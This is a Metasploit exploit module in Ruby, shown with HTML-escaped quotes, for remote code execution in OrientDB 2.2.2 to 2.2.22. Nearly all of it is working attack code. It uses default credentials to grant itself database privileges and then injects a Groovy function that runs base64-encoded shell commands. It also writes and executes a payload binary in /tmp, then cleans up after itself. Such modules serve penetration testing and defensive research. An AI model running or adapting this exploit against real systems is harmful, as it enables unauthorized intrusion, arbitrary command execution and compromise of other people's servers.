# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OrientDB 2.2.x Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module leverages a privilege escalation on OrientDB to execute unsandboxed OS commands.
          All versions from 2.2.2 up to 2.2.22 should be vulnerable.
      },
      &#039;Author&#039;  =>
        [
          &#039;Francis Alexander - Beyond Security\&#039;s SecuriTeam Secure Disclosure program&#039;, # Public PoC
          &#039;Ricardo Jorge Borges de Almeida ricardojba1[at]gmail.com&#039;, # Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/3318&#039;],
          [&#039;URL&#039;, &#039;http://www.palada.net/index.php/2017/07/13/news-2112/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/orientechnologies/orientdb/wiki/OrientDB-2.2-Release-Notes#2223---july-11-2017&#039;]
        ],
      &#039;Platform&#039;  => %w{ linux unix win },
      &#039;Privileged&#039;  => false,
      &#039;Targets&#039;   =>
        [
          [&#039;Linux&#039;,    {&#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; }],
          [&#039;Unix CMD&#039;, {&#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => &#039;unix&#039;, &#039;Payload&#039; => {&#039;BadChars&#039; => "\x22"}}],
          [&#039;Windows&#039;,  {&#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;win&#039;, &#039;CmdStagerFlavor&#039; => [&#039;vbs&#039;,&#039;certutil&#039;]}]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 13 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(2480),
        OptString.new(&#039;USERNAME&#039;, [ true,  &#039;HTTP Basic Auth User&#039;, &#039;writer&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true,  &#039;HTTP Basic Auth Password&#039;, &#039;writer&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [ true,  &#039;The path to the OrientDB application&#039;, &#039;/&#039; ])
      ])
  end

  def check
    uri = target_uri
    uri.path = normalize_uri(uri.path)
    res = send_request_raw({&#039;uri&#039; => "#{uri.path}listDatabases"})
    if res and res.code == 200 and res.headers[&#039;Server&#039;] =~ /OrientDB Server v\.2\.2\./
      print_good("Version: #{res.headers[&#039;Server&#039;]}")
      return Exploit::CheckCode::Vulnerable
    else
      print_status("Version: #{res.headers[&#039;Server&#039;]}")
      return Exploit::CheckCode::Safe
    end
  end

  def http_send_command(cmd, opts = {})
    # 1 -Create the malicious function
    func_name = Rex::Text::rand_text_alpha(5).downcase
    request_parameters = {
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(@uri.path, "/document/#{opts}/-1:-1"),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;*/*&#039;, &#039;Content-Type&#039; => &#039;application/json;charset=UTF-8&#039; },
      &#039;data&#039; => "{\"@class\":\"ofunction\",\"@version\":0,\"@rid\":\"#-1:-1\",\"idempotent\":null,\"name\":\"#{func_name}\",\"language\":\"groovy\",\"code\":\"#{java_craft_runtime_exec(cmd)}\",\"parameters\":null}"
    }
    res = send_request_raw(request_parameters)
    if not (res and res.code == 201)
      begin
        json_body = JSON.parse(res.body)
      rescue JSON::ParserError
        fail_with(Failure::Unknown, &#039;Failed to create the malicious function.&#039;)
        return
      end
    end
    # 2 - Trigger the malicious function
    request_parameters = {
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(@uri.path, "/function/#{opts}/#{func_name}"),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;*/*&#039;, &#039;Content-Type&#039; => &#039;application/json;charset=UTF-8&#039; },
      &#039;data&#039; => ""
    }
    req = send_request_raw(request_parameters)
    if not (req and req.code == 200)
      begin
        json_body = JSON.parse(res.body)
      rescue JSON::ParserError
        fail_with(Failure::Unknown, &#039;Failed to trigger the malicious function.&#039;)
        return
      end
    end
    # 3 - Get the malicious function id
    if res && res.body.length > 0
      begin
        json_body = JSON.parse(res.body)["@rid"]
      rescue JSON::ParserError
        fail_with(Failure::Unknown, &#039;Failed to obtain the malicious function id for deletion.&#039;)
        return
      end
    end
    func_id = json_body.slice(1..-1)
    # 4 - Delete the malicious function
    request_parameters = {
      &#039;method&#039;    => &#039;DELETE&#039;,
      &#039;uri&#039;       => normalize_uri(@uri.path, "/document/#{opts}/#{func_id}"),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;*/*&#039; },
      &#039;data&#039; => ""
    }
    rer = send_request_raw(request_parameters)
    if not (rer and rer.code == 204)
      begin
        json_body = JSON.parse(res.body)
      rescue JSON::ParserError
        fail_with(Failure::Unknown, &#039;Failed to delete the malicious function.&#039;)
        return
      end
    end
  end

  def java_craft_runtime_exec(cmd)
    decoder = Rex::Text.rand_text_alpha(5, 8)
    decoded_bytes = Rex::Text.rand_text_alpha(5, 8)
    cmd_array = Rex::Text.rand_text_alpha(5, 8)
    jcode =  "sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\n"
    jcode << "byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"
    jcode << "String [] #{cmd_array} = new String[3];\n"
    if target[&#039;Platform&#039;] == &#039;win&#039;
      jcode << "#{cmd_array}[0] = \"cmd.exe\";\n"
      jcode << "#{cmd_array}[1] = \"/c\";\n"
    else
      jcode << "#{cmd_array}[0] = \"/bin/sh\";\n"
      jcode << "#{cmd_array}[1] = \"-c\";\n"
    end
    jcode << "#{cmd_array}[2] = new String(#{decoded_bytes}, \"UTF-8\");\n"
    jcode << "Runtime.getRuntime().exec(#{cmd_array});\n"
    jcode
  end

  def on_new_session(client)
    if not @to_delete.nil?
      print_warning("Deleting #{@to_delete} payload file")
      execute_command("rm #{@to_delete}")
    end
  end

  def execute_command(cmd, opts = {})
    vprint_status("Attempting to execute: #{cmd}")
    @uri = target_uri
    @uri.path = normalize_uri(@uri.path)
    res = send_request_raw({&#039;uri&#039; => "#{@uri.path}listDatabases"})
    if res && res.code == 200 && res.body.length > 0
      begin
        json_body = JSON.parse(res.body)["databases"]
      rescue JSON::ParserError
        print_error("Unable to parse JSON")
        return
      end
    else
      print_error("Timeout or unexpected response...")
      return
    end
    targetdb = json_body[0]
    http_send_command(cmd,targetdb)
  end

  def linux_stager
    cmds = "echo LINE | tee FILE"
    exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
    base64 = Rex::Text.encode_base64(exe)
    base64.gsub!(/\=/, "\\u003d")
    file = rand_text_alphanumeric(4+rand(4))
    execute_command("touch /tmp/#{file}.b64")
    cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
    base64.each_line do |line|
      line.chomp!
      cmd = cmds
      cmd.gsub!(/LINE/, line)
      execute_command(cmds)
    end
    execute_command("base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
    execute_command("chmod +x /tmp/#{file}")
    execute_command("rm /tmp/#{file}.b64")
    execute_command("/tmp/#{file}")
    @to_delete = "/tmp/#{file}"
  end

  def exploit
    @uri = target_uri
    @uri.path = normalize_uri(@uri.path)
    res = send_request_raw({&#039;uri&#039; => "#{@uri.path}listDatabases"})
    if res && res.code == 200 && res.body.length > 0
      begin
        json_body = JSON.parse(res.body)["databases"]
      rescue JSON::ParserError
        print_error("Unable to parse JSON")
        return
      end
    else
      print_error("Timeout or unexpected response...")
      return
    end
    targetdb = json_body[0]
    privs_enable = [&#039;create&#039;,&#039;read&#039;,&#039;update&#039;,&#039;execute&#039;,&#039;delete&#039;]
    items = [&#039;database.class.ouser&#039;,&#039;database.function&#039;,&#039;database.systemclusters&#039;]
    # Set the required DB permissions
    privs_enable.each do |priv|
      items.each do |item|
       request_parameters = {
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(@uri.path, "/command/#{targetdb}/sql/-/20"),
        &#039;vars_get&#039; => { &#039;format&#039; => &#039;rid,type,version,class,graph&#039; },
        &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
        &#039;headers&#039; => { &#039;Accept&#039; => &#039;*/*&#039; },
        &#039;data&#039; => "GRANT #{priv} ON #{item} TO writer"
       }
       res = send_request_raw(request_parameters)
      end
    end
    # Exploit
    case target[&#039;Platform&#039;]
    when &#039;win&#039;
      print_status("#{rhost}:#{rport} - Sending command stager...")
      execute_cmdstager(flavor: :vbs)
    when &#039;unix&#039;
      print_status("#{rhost}:#{rport} - Sending payload...")
      res = http_send_command("#{payload.encoded}","#{targetdb}")
    when &#039;linux&#039;
      print_status("#{rhost}:#{rport} - Sending Linux stager...")
      linux_stager
    end
    handler
    # Final Cleanup
    privs_enable.each do |priv|
      items.each do |item|
       request_parameters = {
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(@uri.path, "/command/#{targetdb}/sql/-/20"),
        &#039;vars_get&#039; => { &#039;format&#039; => &#039;rid,type,version,class,graph&#039; },
        &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
        &#039;headers&#039; => { &#039;Accept&#039; => &#039;*/*&#039; },
        &#039;data&#039; => "REVOKE #{priv} ON #{item} FROM writer"
       }
       res = send_request_raw(request_parameters)
      end
    end
   end
end

